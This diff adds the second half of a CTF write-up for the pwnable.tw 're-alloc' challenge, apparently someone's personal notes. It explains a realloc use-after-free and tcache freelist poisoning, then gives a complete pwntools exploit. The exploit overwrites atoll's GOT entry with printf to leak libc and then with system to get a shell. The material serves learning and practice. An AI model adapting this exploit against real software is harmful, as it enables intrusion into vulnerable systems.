@@ -111,8 +111,262 @@ At this point I've concluded the challenge must involve the `realloc(ptr, 0)` vu
 
 Well, if the size would be `0` - just as `free`, hence we'd encounter the same problem as before. \
 **However, in case the size isn't `0`, `realloc` checks if the desired requested size corresponds to the chunk's size (within the metadata), and if so - simply returns the given pointer as-is!**
-This feature is amazing - because `realloc` design doesn't considers the wrecked case of given freed ptr parameter, calling `realloc` on freed chunk with its adequate size is "no-op" - and returns its valid pointer, without touching any freelist. 
-
+This feature is amazing - because `realloc` design doesn't considers the wrecked case of given freed ptr parameter, calling `realloc` on freed chunk with its adequate size is "no-op" - and returns its valid pointer, without touching any freelist. \
 Within the challenge, it allows us to write content directly to the freed tcache chunk, **while still keeping it inside the tcache freelist**. 
 
+Next, because our overwritten chunk is the freelist's head, we'd like to perform 2 allocations. The caveat is that we only have 2 available slots. \
+If we would free our overwritten chunk, it would be the next freelist head - instead of our target fake chunk. \
+The trick is to use realloc to linearly increase the chunks, for example from size class `0x30` to `0x40`, without any memory-reallocation. 
+That way, when we would free the chunk back - it would get to the freelist head of another bin, leaving our target fake chunk at the head of its bin.
 
+### Read Primitive
+
+Using the write primitive, simply overwrite `atoll` to `printf`, and use format specifiers to leak content off registers / stack memory. 
+
+## Solution
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+HOST = 'chall.pwnable.tw'
+PORT = 10106
+context.arch='amd64'
+BINARY = './re-alloc'
+LIBC = './libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so'
+LD = './ld-2.29.so'
+
+GDB_SCRIPT = '''
+#b *0x40155c
+# commands
+#    p "gonna call realloc"
+# end
+
+#b *0x401632
+#commands
+#    p "gonna call free"
+#end
+
+#b *0x4013f1
+#commands
+#    p "gonna call alloc"
+#end
+
+b *0x40129d
+commands
+   p "gonna call atoll.."
+end
+
+ignore 1 31
+
+c
+'''
+
+def unsigned(n, bitness=32):
+    if n < 0:
+        n = n + 2**bitness
+    return n
+
+def pad(buf, alignment, delimiter=b'\x00'):
+    if (len(buf) % alignment) == 0:
+        return buf
+
+    extra = (alignment - (len(buf) % alignment)) * delimiter
+    return buf + extra
+
+def splitted(buf, n):
+    for i in range(0, len(buf), n):
+        yield buf[i: i + n]
+
+def chunkSize(alloc_size):
+    assert(alloc_size >= 0)
+    min_size = alloc_size + SIZEOF_PTR
+    res = min_size % (2 * SIZEOF_PTR)
+    pad = (2 * SIZEOF_PTR) - res if res else 0
+    return min_size + pad
+
+def allocSize(chunkSize):
+    assert((chunkSize & 0xf) == 0)
+    return chunkSize - SIZEOF_PTR
+
+def recvPointer(p):
+    leak = p.recv(SIZEOF_PTR)
+    assert(len(leak) == SIZEOF_PTR)
+    leak = u32(leak)
+    assert(leak > 0x10000)
+    return leak
+
+###### Constants ######
+IS_DEBUG = False
+IS_REMOTE = True
+SIZEOF_PTR = 8
+CHUNK_DELTA = 0x10
+SMALL_CHUNK_SIZE = 0x28
+LARGE_CHUNK_SIZE = SMALL_CHUNK_SIZE + 3 * CHUNK_DELTA
+
+
+###### Offsets ######
+libc_leak_to_base = 0x12e009
+
+###### Addresses ######
+binary = ELF(BINARY)
+main_binary = binary.symbols['main']
+puts_got = binary.got['puts']
+puts_plt = binary.plt['puts']
+atoll_got = binary.got['atoll']
+printf_got = binary.got['printf']
+printf_plt = binary.plt['printf']
+
+libc = ELF(LIBC)
+bin_sh_libc = next(libc.search(b'/bin/sh'))
+system_libc = libc.symbols['system']
+puts_libc = libc.symbols['puts']
+environ_libc = libc.symbols['environ']
+log.info(f'bin_sh_libc: {hex(bin_sh_libc)}')
+log.info(f'system_libc: {hex(system_libc)}')
+log.info(f'puts_libc: {hex(puts_libc)}')
+log.info(f'environ: {hex(environ_libc)}')
+
+libc_rop = ROP(LIBC)
+# pop_eax_ret = libc_rop.eax.address
+# pop_ebx_ret = libc_rop.ebx.address
+# pop_ecx_ret = libc_rop.ecx.address
+# pop_edx_ret = libc_rop.edx.address
+# leave_ret = libc_rop.find_gadget(['leave']).address
+# int_80 = libc_rop.find_gadget(['int 0x80']).address
+# log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
+# log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
+# log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
+# log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
+# log.info(f'leave_ret: {hex(leave_ret)}')
+# log.info(f'int_80: {hex(int_80)}')
+
+def alloc(p, index, size, data):
+    p.sendline(b'1')
+    p.recvuntil(b'Index:')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Size:')
+    p.sendline(str(size).encode())
+    p.recvuntil(b'Data:')
+    p.send(data)
+    p.recvuntil(b'Your choice: ')
+
+def adjusted_alloc(p, index, size, data):
+    ''' Performs alloc, but assumes atoll was overwritten with printf.
+    Hence, controls the fake "atoll" retval using printf retval, which is the number of printed characters
+    '''
+    p.sendline(b'1')
+    p.recvuntil(b'Index:')
+    buf_1 = b'%' + str(index).encode() + b'c\x00'
+    p.send(buf_1)
+    p.recvuntil(b'Size:')
+    buf_2 = b'%' + str(size).encode() + b'c\x00'
+    p.send(buf_2)
+    p.recvuntil(b'Data:')
+    p.send(data)
+    p.recvuntil(b'Your choice: ')
+
+def realloc(p, index, size, data):
+    p.sendline(b'2')
+    p.recvuntil(b'Index:')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Size:')
+    p.sendline(str(size).encode())
+    if size == 0:
+        p.recvuntil(b'alloc error\n')
+    else: 
+        p.recvuntil(b'Data:')
+        p.send(data)
+    p.recvuntil(b'Your choice: ')
+
+def free(p, index):
+    p.sendline(b'3')
+    p.recvuntil(b'Index:')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Your choice: ')
+
+def leak_libc(p):
+    # fake realloc, to make sure this would fail.
+    p.sendline(b'2')
+    p.recvuntil(b'Index:')
+    buf = b'%3$llu'
+    p.send(buf)
+    data = p.recvuntil(b'Invalid !')
+    leak = data[:data.find(b'Invalid !')]
+    leak = int(leak, 10)
+    libc_base = leak - libc_leak_to_base
+    assert((libc_base & 0xfff) == 0)
+    p.recvuntil(b'Your choice: ')
+    return libc_base
+
+def set_freelist_head_addr(p, addr, chunk_size):
+    ''' Sets the freelist head of tcachebin corresponding to size class 'chunk_size'.
+    Apparently, for glibc-2.29, eventhough the tcachebin's count is 0, as long as its head isn't NULL - it would perform allocation.
+    For newer versions of glibc this isn't the case anymore, and __libc_malloc mitigates this,
+    by also verifying that the count is larger than 0.
+    '''
+    small_buf = b'A' * chunk_size
+
+    # Allocate target chunk
+    alloc(p, 0, chunk_size, small_buf)    
+    # Free it
+    realloc(p, 0, 0, b'')                   
+    # Overwrite freed chunk's next
+    realloc(p, 0, chunk_size, p64(addr))   
+    # We'd like to consume the first chunk within the freelist, 
+    # so the tcache head would now point to the target address
+    alloc(p, 1, chunk_size, b'B' * 8)  
+    # Restore state - we'd like to reset both pointers back to NULL.
+    # The problem is that free on the same size chunks would return them back to the first tcache freelist,
+    # hence - return the freelist head to whatever it was instead of our target.
+    # The idea is to change their chunk size, such that they would be returned to a different tcachebin.
+    # Notice we utilize the fact that realloc CAN grow linearly, and does not performs reallocation in this case.
+    # Otherwise, memory reallocations would wreck us - as they'd be causing free on the previous small chunk. 
+    realloc(p, 1, chunk_size + CHUNK_DELTA, b'B' * 8)
+    free(p, 1)
+    realloc(p, 0, chunk_size + CHUNK_DELTA * 2, b'B' * 8)
+    free(p, 0)
+
+####### Exploit #######
+def exploit(p):
+    p.recvuntil(b'Your choice: ')
+
+    # Step 1 - overwrite atoll to printf, and leak libc using format string
+    set_freelist_head_addr(p, addr=atoll_got, chunk_size=SMALL_CHUNK_SIZE)
+
+    # Step 2 - call system("/bin/sh"), also by overwriting of atoll's GOT
+    set_freelist_head_addr(p, addr=atoll_got, chunk_size=LARGE_CHUNK_SIZE)
+
+    # Overwrite atoll to printf
+    alloc(p, 0, SMALL_CHUNK_SIZE, p64(printf_plt)) 
+    libc_base = leak_libc(p) 
+    log.info(f'libc_base: {hex(libc_base)}')
+
+    # Overwrite atoll to system 
+    system_addr = libc_base + system_libc
+    log.info(f'system_addr: {hex(system_addr)}')
+    adjusted_alloc(p, 1, LARGE_CHUNK_SIZE, p64(system_addr)) 
+
+    # Trigger system("/bin/sh")
+    p.sendline(b'2')
+    p.recvuntil(b'Index:')
+    p.sendline(b'/bin/sh\x00')
+
+def main():
+    if IS_DEBUG:
+        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
+    else:
+        if IS_REMOTE:
+            p = remote(HOST, PORT)
+        else:
+            p = process(BINARY)
+
+    exploit(p)
+
+    log.info('Win')
+    p.interactive()
+
+if __name__ == '__main__':
+    main()
+```
